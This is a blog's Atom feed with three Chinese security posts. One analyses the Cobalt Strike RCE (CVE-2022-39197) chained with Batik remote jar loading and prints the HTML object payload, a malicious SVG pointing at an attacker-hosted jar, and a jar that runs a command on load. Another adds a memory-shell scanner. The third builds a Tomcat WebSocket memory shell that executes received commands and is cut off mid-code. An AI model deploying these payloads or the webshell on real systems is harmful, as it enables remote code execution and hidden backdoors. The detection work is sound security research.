@@ -1,0 +1,3235 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://liangyueliangyue.github.io</id>
+    <title>6right</title>
+    <updated>2023-06-06T03:15:52.575Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://liangyueliangyue.github.io"/>
+    <link rel="self" href="https://liangyueliangyue.github.io/atom.xml"/>
+    <subtitle>温润如玉</subtitle>
+    <logo>https://liangyueliangyue.github.io/images/avatar.png</logo>
+    <icon>https://liangyueliangyue.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2023, 6right</rights>
+    <entry>
+        <title type="html"><![CDATA[CoBaltStrike RCE分析]]></title>
+        <id>https://liangyueliangyue.github.io/post/cobaltstrike-rce-fen-xi/</id>
+        <link href="https://liangyueliangyue.github.io/post/cobaltstrike-rce-fen-xi/">
+        </link>
+        <updated>2022-10-21T13:41:25.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="cobaltstrike-rce分析">CoBaltStrike RCE分析</h1>
+<h2 id="前言">前言</h2>
+<p>看了一下最后用的Apache Batik 组件的加载jar，刚好也分析过CVE-2022-40146就一起看了</p>
+<h2 id="cve-2022-39197">CVE-2022-39197</h2>
+<p>漏洞描述：在 HelpSystems Cobalt Strike 到 4.7 中发现了一个 XSS（跨站点脚本）漏洞，允许远程攻击者在 Cobalt Strike 团队服务器上执行 HTML</p>
+<p>从官方的修复及回应中也可以看出这是一个上升至远程代码执行的漏洞：https://www.cobaltstrike.com/blog/out-of-band-update-cobalt-strike-4-7-1/</p>
+<p>而这个XSS是由Swing的html解析器导致的</p>
+<p>简单写一个demo</p>
+<pre><code class="language-java">import javax.swing.*;
+
+public class Test {
+    public static void main(String[] args) {
+        JFrame jFrame = new JFrame(&quot;Test1&quot;);
+        JLabel jLabel = new JLabel(&quot;&lt;html&gt;&lt;h1&gt;6right&lt;/h1&gt;&lt;/html&gt;&quot;);
+        jFrame.add(jLabel);
+        jFrame.setSize(400,500);
+        jFrame.setVisible(true);
+    }
+}
+
+</code></pre>
+<p>运行上面的代码片段将创建一个新的<em>JFrame</em>，其中包含一个 使用 HTML 设置标签主体样式的*JLabel 。*在这种情况下，JLabel文本解析了HTML，而JFrame没有。</p>
+<ul>
+<li>JLabel</li>
+<li>JButton</li>
+<li>JToggleButton</li>
+<li>JCheckBox</li>
+<li>JRadioButton</li>
+<li>JMenu</li>
+<li>JMenuItem</li>
+<li>JCheckBoxMenuItem</li>
+<li>JRadioButtonMenuItem</li>
+<li>JComboBox</li>
+<li>JList</li>
+<li>JTable</li>
+<li>JTree</li>
+<li>JToolTip等等</li>
+</ul>
+<figure data-type="image" tabindex="1"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202210201601025.png" alt="image-20221019102040747" loading="lazy"></figure>
+<p>那不是直接使用<code>&lt;script&gt;</code>就好了？</p>
+<p>但是并没有想象的那么简单，在包含scrpt时，并没有执行预期的弹窗，我们下断点看一下</p>
+<p>在https://docs.oracle.com/en/java/javase/11/docs/api/java.desktop/javax/swing/text/html/HTMLDocument.HTMLReader.html中可以看到虽然定义了Script applet等标签，但都是还没有支持</p>
+<p>但是他支持了<object>标签，可以看下html中object标签的定义：此元素允许您规定插入 HTML 文档中的对象的数据和参数，以及可用来显示和操作数据的代码。</p>
+<p>显然是有操作性的，查看OBJECT标签对象的被调用</p>
+<p>javax.swing.text.html.HTMLEditorKit.HTMLFactory#create</p>
+<pre><code class="language-java">else if (kind == HTML.Tag.OBJECT) {
+                    return new ObjectView(elem);
+</code></pre>
+<p>创建了ObjectView对象，查看他的类说明很清晰</p>
+<pre><code class="language-java">&lt;object classid=&quot;javax.swing.JLabel&quot;&gt;
+        &lt;param name=&quot;text&quot; value=&quot;sample text&quot;&gt;
+        &lt;/object&gt;
+</code></pre>
+<p>将尝试加载classid属性指定的类。如果可能，将使用用于加载关联文档的Classloader。这通常与用于加载EditorKit的ClassLoader相同。如果文档的ClassLoader为空，则为Class。使用forName。</p>
+<p>如果类能够成功加载，则会尝试通过调用class.newInstance来创建它的实例。将尝试将实例缩小为java.awt类型。组件以显示对象。</p>
+<p>也就是可以使用classid指定全类名进行反射加载，但是存在限制条件</p>
+<p>看一下javax.swing.text.html.ObjectView#createComponent代码</p>
+<pre><code class="language-java"> protected Component createComponent() {
+        AttributeSet attr = getElement().getAttributes();
+        String classname = (String) attr.getAttribute(HTML.Attribute.CLASSID);
+        try {
+            ReflectUtil.checkPackageAccess(classname);
+            Class c = Class.forName(classname, true,Thread.currentThread().
+                                    getContextClassLoader());
+            Object o = c.newInstance();
+            if (o instanceof Component) {
+                Component comp = (Component) o;
+                setParameters(comp, attr);
+                return comp;
+            }
+        } catch (Throwable e) {
+            // couldn't create a component... fall through to the
+            // couldn't load representation.
+        }
+</code></pre>
+<p>反射加载全类名，然后初始化指定类示例（这里必须要无参构造方法），再检查初始化是否是Component的实例</p>
+<ul>
+<li>是：将返回对象，并调用setParameters</li>
+<li>不是：将返回getUnloadableRepresentation的返回值</li>
+</ul>
+<pre><code class="language-java">Component getUnloadableRepresentation() {
+        // PENDING(prinz) get some artwork and return something
+        // interesting here.
+        Component comp = new JLabel(&quot;??&quot;);
+        comp.setForeground(Color.red);
+        return comp;
+    }
+</code></pre>
+<p>在进入到javax.swing.text.html.ObjectView#setParameters</p>
+<pre><code class="language-java">private void setParameters(Component comp, AttributeSet attr) {
+        Class k = comp.getClass();
+        BeanInfo bi;
+        try {
+            bi = Introspector.getBeanInfo(k);
+        } catch (IntrospectionException ex) {
+            System.err.println(&quot;introspector failed, ex: &quot;+ex);
+            return;             // quit for now
+        }
+        PropertyDescriptor props[] = bi.getPropertyDescriptors();
+        for (int i=0; i &lt; props.length; i++) {
+            //      System.err.println(&quot;checking on props[i]: &quot;+props[i].getName());
+            Object v = attr.getAttribute(props[i].getName());
+            if (v instanceof String) {
+                // found a property parameter
+                String value = (String) v;
+                Method writer = props[i].getWriteMethod();
+                if (writer == null) {
+                    // read-only property. ignore
+                    return;     // for now
+                }
+                Class[] params = writer.getParameterTypes();
+                if (params.length != 1) {
+                    // zero or more than one argument, ignore
+                    return;     // for now
+                }
+                Object [] args = { value };
+                try {
+                    MethodUtil.invoke(writer, comp, args);
+                } catch (Exception ex) {
+                    System.err.println(&quot;Invocation failed&quot;);
+                    // invocation code
+                }
+            }
+        }
+    }
+
+</code></pre>
+<p>看invoke调用，需要过两个判断</p>
+<ul>
+<li>类对象必须存在一个属性存在setter方法(在jlabel中存在setText方法)</li>
+</ul>
+<pre><code class="language-java">Method writer = props[i].getWriteMethod();
+                if (writer == null) {
+                    // read-only property. ignore
+                    return;     // for now
+                }
+</code></pre>
+<ul>
+<li>setter方法必须只有一个参数</li>
+</ul>
+<pre><code class="language-java">Class[] params = writer.getParameterTypes();
+                if (params.length != 1) {
+                    // zero or more than one argument, ignore
+                    return;     // for now
+                }
+</code></pre>
+<ul>
+<li>setter方法参数必须是String类型</li>
+</ul>
+<pre><code class="language-java">Object v = attr.getAttribute(props[i].getName());
+            if (v instanceof String) {
+                // found a property parameter
+                String value = (String) v;
+                xxxx
+</code></pre>
+<p>这里的v是object对象中的value值，而属性名就是object对象的name值</p>
+<p>所以总结完利用条件如下：</p>
+<ol>
+<li>类必须继承自<em>java.awt.Component</em></li>
+<li>必须有无参构造方法</li>
+<li>类对象必须存在一个属性存在setter方法</li>
+<li>setter方法的参数必须是一个且为string类型</li>
+</ol>
+<h2 id="筛选符合条件结果">筛选符合条件结果</h2>
+<p>这里使用tabby筛选</p>
+<p>cypher：</p>
+<pre><code class="language-sql">match (source:Method {IS_SETTER:true})&lt;-[:HAS]-(cls:Class {HAS_DEFAULT_CONSTRUCTOR: TRUE})-[:INTERFACE|EXTENDS*]-&gt;(cls1:Class {NAME:&quot;java.awt.Component&quot;}) 
+where source.SUB_SIGNATURE =~ &quot;.* set\w+\(java.lang.String\)&quot;
+return distinct source.SIGNATURE
+</code></pre>
+<p>结果（42个，这里我使用的cs4.3）：</p>
+<table>
+<thead>
+<tr>
+<th>1</th>
+<th>&quot;&lt;org.apache.xalan.client.XSLTProcessorApplet: void setDocumentURL(java.lang.String)&gt;&quot;</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>2</td>
+<td>&quot;&lt;org.apache.xalan.client.XSLTProcessorApplet: void setStyleURL(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>3</td>
+<td>&quot;&lt;java.awt.Frame: void setTitle(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>4</td>
+<td>&quot;&lt;sun.awt.EmbeddedFrame: void setTitle(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>5</td>
+<td>&quot;&lt;javax.swing.JComponent: void setToolTipText(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>6</td>
+<td>&quot;&lt;org.apache.batik.util.gui.UserStyleDialog$Panel: void setPath(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>7</td>
+<td>&quot;&lt;org.apache.batik.util.gui.LanguageDialog$Panel: void setLanguages(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>8</td>
+<td>&quot;&lt;console.AssociatedPanel: void setBeaconID(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>9</td>
+<td>&quot;&lt;console.Console: void setStyle(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>10</td>
+<td>&quot;&lt;console.Console: void setDefaultPrompt(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>11</td>
+<td>&quot;&lt;console.Console: void setPrompt(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>12</td>
+<td>&quot;&lt;org.apache.batik.apps.svgbrowser.StatusBar: void setMessage(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>13</td>
+<td>&quot;&lt;org.apache.batik.apps.svgbrowser.StatusBar: void setMainMessage(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>14</td>
+<td>&quot;&lt;console.Display: void setTextDirect(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>15</td>
+<td>&quot;&lt;console.Display: void setText(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>16</td>
+<td>&quot;&lt;org.apache.batik.util.gui.LocationBar: void setText(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>17</td>
+<td>&quot;&lt;org.apache.batik.util.gui.CSSMediaPanel: void setMedia(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>18</td>
+<td>&quot;&lt;javax.swing.JPopupMenu: void setLabel(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>19</td>
+<td>&quot;&lt;javax.swing.text.JTextComponent: void setText(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>20</td>
+<td>&quot;&lt;javax.swing.JTextField: void setActionCommand(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>21</td>
+<td>&quot;&lt;javax.swing.JEditorPane: void setText(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>22</td>
+<td>&quot;&lt;javax.swing.JEditorPane: void setCharsetFromContentTypeParameters(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>23</td>
+<td>&quot;&lt;javax.swing.JEditorPane: void setContentType(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>24</td>
+<td>&quot;&lt;javax.swing.JEditorPane: void setPage(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>25</td>
+<td>&quot;&lt;org.apache.batik.util.gui.xmleditor.XMLTextEditor: void setText(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>26</td>
+<td>&quot;&lt;aggressor.AggressorClient: void setTitle(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>27</td>
+<td>&quot;&lt;javax.swing.AbstractButton: void setLabel(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>28</td>
+<td>&quot;&lt;javax.swing.AbstractButton: void setText(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>29</td>
+<td>&quot;&lt;javax.swing.AbstractButton: void setActionCommand(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>30</td>
+<td>&quot;&lt;javax.swing.JLabel: void setText(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>31</td>
+<td>&quot;&lt;org.apache.batik.swing.svg.AbstractJSVGComponent: void setFragmentIdentifier(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>32</td>
+<td>&quot;&lt;org.apache.batik.swing.JSVGCanvas: void setURI(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>33</td>
+<td>&quot;&lt;javax.swing.JFileChooser: void setDialogTitle(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>34</td>
+<td>&quot;&lt;javax.swing.JFileChooser: void setApproveButtonToolTipText(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>35</td>
+<td>&quot;&lt;javax.swing.JFileChooser: void setApproveButtonText(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>36</td>
+<td>&quot;&lt;graph.NetworkGraph: void setAutoLayout(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>37</td>
+<td>&quot;&lt;javax.swing.JToolTip: void setTipText(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>38</td>
+<td>&quot;&lt;javax.swing.JProgressBar: void setString(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>39</td>
+<td>&quot;&lt;javax.swing.JInternalFrame: void setTitle(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>40</td>
+<td>&quot;&lt;javax.swing.JComboBox: void setActionCommand(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>41</td>
+<td>&quot;&lt;java.awt.TextField: void setText(java.lang.String)&gt;&quot;</td>
+</tr>
+<tr>
+<td>42</td>
+<td>&quot;&lt;java.awt.Label: void setText(java.lang.String)&gt;&quot;</td>
+</tr>
+</tbody>
+</table>
+<h2 id="batik远程加载jar">batik远程加载jar</h2>
+<p>这里对所有符合条件的方法进行筛选也是一个耗时的过程，在已知的情况下我就直接分析&lt;org.apache.batik.swing.JSVGCanvas: void setURI(java.lang.String)&gt;了</p>
+<p>已知：batik对SVG对象进行处理时，可以通过xlink:href对jar包进行解析，batik最后是在org.apache.batik.bridge.BaseScriptingEnvironment#loadScript处</p>
+<pre><code class="language-java">if (type.equals(&quot;application/java-archive&quot;)) {
+                try {
+                    String href = XLinkSupport.getXLinkHref(script);
+                    ParsedURL purl = new ParsedURL(script.getBaseURI(), href);
+                    this.checkCompatibleScriptURL(type, purl);
+                    URL docURL = null;
+
+                    try {
+                        docURL = new URL(this.docPURL.toString());
+                    } catch (MalformedURLException var14) {
+                    }
+
+                    DocumentJarClassLoader cll = new DocumentJarClassLoader(new URL(purl.toString()), docURL);
+                        URL url = cll.findResource(&quot;META-INF/MANIFEST.MF&quot;);
+                    if (url == null) {
+                        return;
+                    }
+
+                    Manifest man = new Manifest(url.openStream());
+                    this.executedScripts.put(script, (Object)null);
+                    mediaType = man.getMainAttributes().getValue(&quot;Script-Handler&quot;);
+                    if (mediaType != null) {
+                        ScriptHandler h = (ScriptHandler)cll.loadClass(mediaType).getDeclaredConstructor().newInstance();
+                        h.run(this.document, this.getWindow());
+                    }
+
+                    mediaType = man.getMainAttributes().getValue(&quot;SVG-Handler-Class&quot;);
+                    if (mediaType != null) {
+                        EventListenerInitializer initializer = (EventListenerInitializer)cll.loadClass(mediaType).getDeclaredConstructor().newInstance();
+                        this.getWindow();
+                        initializer.initializeEventListeners((SVGDocument)this.document);
+                    }
+                } catch (Exception var16) {
+                    if (this.userAgent != null) {
+                        this.userAgent.displayError(var16);
+                    }
+                }
+</code></pre>
+<p>在cs4.3中是org.apache.batik.bridge.BaseScriptingEnvironment#loadScripts，先打上断点</p>
+<p>构造一个恶意svg文件</p>
+<pre><code class="language-java">&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;
+     xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; width=&quot;450&quot; height=&quot;500&quot;
+     viewBox=&quot;0 0 450 500&quot;&gt;
+    &lt;script type=&quot;application/java-archive&quot; xlink:href=&quot;http://192.168.102.19:8081/CVE_2022_40146.jar&quot;&gt;&lt;/script&gt;
+&lt;/svg&gt;
+</code></pre>
+<p>然后该更JLable值</p>
+<pre><code class="language-java">JLabel jLabel = new JLabel(&quot;&lt;html&gt;&lt;object classid=\&quot;org.apache.batik.swing.JSVGCanvas\&quot;&gt;\n&quot; +
+        &quot;        &lt;param name=\&quot;URI\&quot; value=\&quot;http://192.168.102.19:8081/test.svg\&quot;&gt;\n&quot; +
+        &quot;        &lt;/object&gt;&lt;/html&gt;&quot;);
+</code></pre>
+<p>中间会经过DefaultScriptSecurity，需要svg文件地址和jar包地址host相同，所以放一块就行</p>
+<p>jar包类，静态方法恶意即可</p>
+<pre><code class="language-java">import java.io.IOException;
+
+public class CVE_2022_40146 {
+        static {
+            try {
+                Runtime.getRuntime().exec(&quot;calc&quot;);
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        }
+}
+
+</code></pre>
+<p>打包成jar，修改META-INF/MANIFEST.MF文件，添加条目Script-Handler: CVE_2022_40146</p>
+<p>因为在org.apache.batik.bridge.BaseScriptingEnvironment#loadScript做了对MANIFEST条目的校验，得实现Script-Handler或SVG-Handler-Class条目才能进入加载字节码，做到命令执行</p>
+<figure data-type="image" tabindex="2"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202210201601027.png" alt="image-20221020112023148" loading="lazy"></figure>
+<h2 id="cs-rce流程">CS RCE流程</h2>
+<p>后续反制可以参考漂亮鼠师傅的 windows api hook</p>
+<ul>
+<li>https://mp.weixin.qq.com/s/l5e2p_WtYSCYYhYE0lzRdQ</li>
+</ul>
+<p>1.将木马文件通过frida运行，用frida脚本 hook Process32Next函数，当木马通过API去获取数据结构中的进程名称(也就是szExeFile)时，得到的是我们脚本传入的恶意html</p>
+<pre><code>&lt;html&gt;&lt;object classid=&quot;org.apache.batik.swing.JSVGCanvas&quot;&gt;&lt;param name=&quot;URI&quot; value=&quot;http://xxx/test.svg&quot;&gt;&lt;/object&gt;&lt;/html&gt;
+</code></pre>
+<p>2.然后swing解析html去访问加载恶意svg文件</p>
+<pre><code>&lt;svg xmlns=&quot;http://www.w3.org/2000/svg&quot;
+     xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; width=&quot;450&quot; height=&quot;500&quot; 
+     viewBox=&quot;0 0 450 500&quot;&gt;
+    &lt;script type=&quot;application/java-archive&quot; xlink:href=&quot;http://192.168.102.19:8081/AttackJar.jar&quot;&gt;&lt;/script&gt;
+&lt;/svg&gt;
+</code></pre>
+<p>3.最后batik解析svg文件去访问加载恶意jar，导致命令执行</p>
+<h2 id="参考">参考</h2>
+<p>https://mp.weixin.qq.com/s/l5e2p_WtYSCYYhYE0lzRdQ</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[WebSocket内存马检测]]></title>
+        <id>https://liangyueliangyue.github.io/post/websocket-nei-cun-ma-jian-ce/</id>
+        <link href="https://liangyueliangyue.github.io/post/websocket-nei-cun-ma-jian-ce/">
+        </link>
+        <updated>2022-10-16T06:09:09.000Z</updated>
+        <content type="html"><![CDATA[<h4 id="检测实现">检测实现</h4>
+<p>这里是基于c0ny1师傅的工具：https://github.com/c0ny1/java-memshell-scanner</p>
+<p>Endpoint信息获取：</p>
+<ul>
+<li>
+<p>从requestContext中获取WsServerContainer容器</p>
+</li>
+<li>
+<p>通过反射得到configExactMatchMap对象</p>
+<figure data-type="image" tabindex="1"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202212091659752.png" alt="image-20221018113017487" loading="lazy"></figure>
+<p>里面通过Map存储Endpoint键值</p>
+</li>
+</ul>
+<pre><code class="language-java">public synchronized Map&lt;String,Object&gt; getExactMatch(HttpServletRequest request) throws Exception{
+                WsServerContainer wsServerContainer = (WsServerContainer) request.getSession().getServletContext().getAttribute(ServerContainer.class.getName());
+                Class&lt;?&gt; obj = Class.forName(&quot;org.apache.tomcat.websocket.server.WsServerContainer&quot;);
+                Field field = obj.getDeclaredField(&quot;configExactMatchMap&quot;);
+                field.setAccessible(true);
+                Map&lt;String, Object&gt; configExactMatchMap = (Map&lt;String, Object&gt;) field.get(wsServerContainer);
+                return configExactMatchMap;
+            }
+</code></pre>
+<p>dump模块：没有改变，直接使用c0ny1的给出类名即可</p>
+<p>kill模块：</p>
+<pre><code class="language-java">public synchronized void deleteEndpint(HttpServletRequest request,String servletName) throws Exception{
+                Map&lt;String,Object&gt; ExactMatch = getExactMatch(request);
+                ExactMatch.remove(servletName);
+            }
+</code></pre>
+<p>通过java.util.Map#remove(java.lang.Object)删除容器中的Endpoint接口</p>
+<p>注意：这里有一个问题，这里只删除了容器中的Endpint，而注入时requestContext中的路径并没有删除，所以会导致无法向容器注入被删除过的路径。</p>
+<ul>
+<li>修改后的源码：https://github.com/liangyueliangyue/java-memshell-scanner</li>
+</ul>
+<p>修改后的效果</p>
+<figure data-type="image" tabindex="2"><img src="https://6right-images.oss-cn-hangzhou.aliyuncs.com/images/202212091659753.png" alt="image-20221018141713851" loading="lazy"></figure>
+<h3 id="总结">总结</h3>
+<p>WebSoket内存马通过分析涉及处理websoket的Endpoint对象，获取请求内容，同时控制响应内容。然后只要模拟对象注册到内存当中过程即可。代理的实现稍微复杂一点，注册的Endpoint对象需要实现与服务端(Endpoint远端)之间的连接与通信</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[WebSocket内存马]]></title>
+        <id>https://liangyueliangyue.github.io/post/websocket-nei-cun-ma/</id>
+        <link href="https://liangyueliangyue.github.io/post/websocket-nei-cun-ma/">
+        </link>
+        <updated>2022-10-15T10:07:42.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="websocket">WebSocket</h2>
+<p>WebSocket标准实用性高，使得浏览器和服务器之间任一方都可主动发消息给对方，这样服务器有新数据时可主动推给浏览器。</p>
+<h3 id="tomcat">tomcat</h3>
+<p>Tomcat自7.0.5版本开始支持WebSocket，并且实现了Java WebSocket规范（JSR356 ），而在7.0.5版本之前（7.0.2版本之后）则采用自定义API，即WebSocketServlet。</p>
+<p>根据JSR356的规定，Java WebSocket应用由一系列的WebSocket Endpoint组成。Endpoint是一个Java对象，代表WebSocket链接的一端，对于服务端，我们可以视为处理具体WebSocket消息的接口，就像Servlet之于HTTP请求一样（不同之处在于Endpoint每个链接一个实例）。</p>
+<h3 id="生命周期">生命周期</h3>
+<p>Endpoint实例在WebSocket握手时创建，并在客户端与服务端链接过程中有效，最后在链接关闭时结束。</p>
+<p>Endpoint的生命周期方法如下：</p>
+<ul>
+<li>onOpen：当开启一个新的会话时调用。这是客户端与服务器握手成功后调用的方法。等同于注解@OnOpen。</li>
+<li>onClose：当会话关闭时调用。等同于注解@OnClose。</li>
+<li>onError：当链接过程中异常时调用。等同于注解@OnError。</li>
+</ul>
+<h3 id="消息会话">消息会话</h3>
+<p>当客户端链接到一个Endpoint时，服务器端会为其创建一个唯一的会话（javax.websocket.Session）。会话在WebSocket握手之后创建，并在链接关闭时结束。当生命周期中触发各个事件时，都会将当前会话传给Endpoint。</p>
+<p>我们通过为Session添加MessageHandler消息处理器来接收消息(很明显，这里请求的回显可以通过MessageHandler和session会话得到)。在这里Session的本质是对Socket的封装，Endpoint通过它与浏览器通信。</p>
+<h3 id="定义endpoint">定义Endpoint</h3>
+<p>我们可以通过两种方式定义Endpoint</p>
+<ul>
+<li>第一种是编程式，即继承类javax.websocket.Endpoint并实现其方法。</li>
+<li>第二种是注解式，即定义一个POJO对象，为其添加Endpoint相关的注解。</li>
+</ul>
+<h3 id="websocket加载">WebSocket加载</h3>
+<p>Tomcat提供了一个javax.servlet.ServletContainerInitializer的实现类org.apache.tomcat.websocket.server.WsSci。因此Tomcat的WebSocket加载是通过SCI机制完成的。</p>
+<p>Web应用启动时，通过WsSci.onStartup方法完成WebSocket的初始化：</p>
+<ul>
+<li>构造WebSocketContainer实例，Tomcat提供的实现类为WsServerContainer。在WsServerContainer构造方法中，Tomcat除了初始化配置外，还会为ServletContext添加一个过滤器org.apache.tomcat.websocket.server.WsFilter，它用于判断当前请求是否为WebSocket请求，以便完成握手，所以会默认创建(这里veo师傅也提到过)。</li>
+</ul>
+<figure data-type="image" tabindex="1"><img src="https://veo.pub/img/memshell/image-20220630102415851.png" alt="img" loading="lazy"></figure>
+<ul>
+<li>可以把WebSocketContainer理解成一个专门处理WebSocket请求的Endpoint容器，他将扫描到的Endpoint子类和添加了注解@ServerEndpoint的类注册到WebSocketContainer上，用于处理WebSocket请求，该容器还维护了URL到Endpoint的映射关系，这样通过请求URL就能找到具体的Endpoint来处理WebSocket请求。</li>
+<li>实现类WsServerContainer存在addEndpoint方法来动态注册endpoint端点发布在指定路径（内存马实现关键）</li>
+</ul>
+<h3 id="websocket请求处理">WebSocket请求处理</h3>
+<p>这一块比较复杂且和内存马关系不大，简单讲一下tomcat的实现</p>
+<p>因为Tomcat是将HTTP协议升级成WebSocket协议的，所以WebSocket是通过HTTP协议握手的，当WebSocket握手请求到来时，HttpProtocolHandler首先接收到这个请求，在处理这个HTTP请求时，Tomcat通过WsFilter判断该当前HTTP请求是否是一个WebSocket Upgrade请求（即包含Upgrade: websocket的HTTP头信息），如果是，则在HTTP响应里添加WebSocket相关的响应头信息，并进行协议升级。</p>
+<pre><code class="language-java">public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
+        if (this.sc.areEndpointsRegistered() &amp;&amp; UpgradeUtil.isWebSocketUpgradeRequest(request, response)) {
+           	...
+            WsMappingResult mappingResult = this.sc.findMapping(path);
+            if (mappingResult == null) {
+                chain.doFilter(request, response);
+            } else {
+                UpgradeUtil.doUpgrade(this.sc, req, resp, mappingResult.getConfig(), mappingResult.getPathParams());
+            }
+        } else {
+            chain.doFilter(request, response);
+        }
+    }
+</code></pre>
+<p>有兴趣可以看看org.apache.tomcat.websocket.server.UpgradeUtil#isWebSocketUpgradeRequest和org.apache.tomcat.websocket.server.UpgradeUtil#doUpgrade的具体实现。</p>
+<p>然后用UpgradeProtocolHandler替换当前的HttpProtocolHandler，相应的，把当前Socket的Processor替换成UpgradeProcessor，同时Tomcat会创建WebSocket Session实例和Endpoint实例，并跟当前的WebSocket连接一一对应起来，UpgradeProcessor最终会调用相应的Endpoint实例来处理请求。</p>
+<h3 id="内存马实现">内存马实现</h3>
+<p>首先实现Endpoint类，显然实战中不可能使用注解方式，通过编程式定义</p>
+<p>处理ws对象基于类 javax.websocket.server.ServerEndpointConfig.builder，ServerEndpointConfig.Builder 是一个用于创建DefaultServerEndpointConfig对象以部署服务器端点的类</p>
+<p>在使用javax.websocket.server.ServerEndpointConfig.Builder#create</p>
+<pre><code class="language-java">public static ServerEndpointConfig.Builder create(Class&lt;?&gt; endpointClass, String path) {
+            return new ServerEndpointConfig.Builder(endpointClass, path);
+        }
+
+###
+private Builder(Class&lt;?&gt; endpointClass, String path) {
+            this.endpointClass = endpointClass;
+            this.path = path;
+        }
+</code></pre>
+<p>配置端点的类和将部署端点的 URI 或 URI 模板(结尾的“/”将被忽略，路径必须以 / 开头)</p>
+<p>javax.websocket.server.ServerEndpointConfig.Builder#build</p>
+<pre><code class="language-java">public ServerEndpointConfig build() {
+            return new DefaultServerEndpointConfig(this.endpointClass, this.path, this.subprotocols, this.extensions, this.encoders, this.decoders, this.configurator);
+        }
+</code></pre>
+<p>DefaultServerEndpointConfig是ServerEndpointConfig接口的具体实现类，即使用已在此Builder对象上设置的当前属性构建DefaultServerEndpointConfig对象。</p>
+<p>值得一提的是他还存在encoders,decoders,subprotocols,extensions等方法可以自定义编码器，解码器，协议，拓展等功能</p>
+<p>现在可以知道，创建一个DefaultServerEndpointConfig对象</p>
+<pre><code class="language-java">DefaultServerEndpointConfig config = ServerEndpointConfig.Builder.create(EndpointInject.class, &quot;/ws&quot;).build();
+</code></pre>
+<p>得到对象之后构造WebSocketContainer实例，Tomcat提供的实现类为WsServerContainer。</p>
+<pre><code class="language-java">ServerContainer container = (ServerContainer) req.getServletContext().getAttribute(ServerContainer.class.getName());
+</code></pre>
+<p>然后调用addEndpoint动态添加端口即可</p>
+<pre><code class="language-java">container.addEndpoint(config);
+</code></pre>
+<p>接下来只需要实现Endpoint对象。</p>
+<p>可以参考：https://abhishek-gupta.gitbook.io/java-websocket-api-handbook/</p>
+<p>首先，我们要自定义一个消息处理器，实现MessageHandler接口：有两个接口，一个是Partial，另一个是Whole接口，Partial用于接收部分消息，Whole用于一次性接收一条完整的消息。所以我们实现Whole接口</p>
+<p>然后重写onMessage和onOpen方法</p>
+<p>websocket  session发送文本消息有两个方法：getAsyncRemote()和getBasicRemote() ，getAsyncRemote是非阻塞式的，getBasicRemote是阻塞式的，这里使用getBasicRemote获取到RemoteEndpoint 对象的引用，然后javax.websocket.RemoteEndpoint.Basic#sendText(java.lang.String)直接发送</p>
+<pre><code class="language-java">public static class C extends Endpoint implements MessageHandler.Whole&lt;String&gt; {
+        private Session session;
+        @Override
+        public void onMessage(String s) {
+            try {
+                Process process;
+                boolean bool = System.getProperty(&quot;os.name&quot;).toLowerCase().startsWith(&quot;windows&quot;);
+                if (bool) {
+                    process = Runtime.getRuntime().exec(new String[] { &quot;cmd.exe&quot;, &quot;/c&quot;, s });
+                } else {
